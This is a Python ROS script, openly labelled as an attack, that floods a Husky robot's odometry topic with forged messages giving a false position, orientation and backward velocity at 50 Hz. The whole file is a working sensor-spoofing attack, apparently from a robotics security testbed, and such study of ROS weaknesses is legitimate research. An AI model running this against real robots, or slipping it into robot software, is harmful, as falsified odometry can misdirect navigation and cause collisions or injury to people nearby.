#!/usr/bin/env python3

import rospy
from nav_msgs.msg import Odometry
from geometry_msgs.msg import Quaternion
import tf

def odom_spoofing_attack():

    try:
        rospy.init_node('odom_spoofer', anonymous=True)
        pub = rospy.Publisher('/husky_velocity_controller/odom', Odometry, queue_size=10)
        rate = rospy.Rate(50)  # Match typical odometry rate
        
        rospy.loginfo("[ATTACK] Odometry spoofing started - Publishing false position data")
        rospy.loginfo("[ATTACK] False position: x=-10.0, y=5.0")
        rospy.loginfo("[ATTACK] False velocity: linear.x=-0.5 (backward)")
        
        while not rospy.is_shutdown():
            fake_odom = Odometry()
            fake_odom.header.stamp = rospy.Time.now()
            fake_odom.header.frame_id = "odom"
            fake_odom.child_frame_id = "base_link"
            
            # Inject false position - make robot think it's somewhere else
            fake_odom.pose.pose.position.x = -10.0
            fake_odom.pose.pose.position.y = 5.0
            fake_odom.pose.pose.position.z = 0.0
            
            # False orientation
            q = tf.transformations.quaternion_from_euler(0, 0, 1.57)  # 90 degrees
            fake_odom.pose.pose.orientation.x = q[0]
            fake_odom.pose.pose.orientation.y = q[1]
            fake_odom.pose.pose.orientation.z = q[2]
            fake_odom.pose.pose.orientation.w = q[3]
            
            # False velocity - moving backward
            fake_odom.twist.twist.linear.x = -0.5
            fake_odom.twist.twist.linear.y = 0.0
            fake_odom.twist.twist.angular.z = 0.5
            
            pub.publish(fake_odom)
            rate.sleep()
            
    except rospy.ROSInterruptException:
        rospy.loginfo("[ATTACK] Odometry spoofing stopped")
    except Exception as e:
        rospy.logerr(f"[ATTACK] Odometry spoofing failed: {str(e)}")

if __name__ == '__main__':
    odom_spoofing_attack()
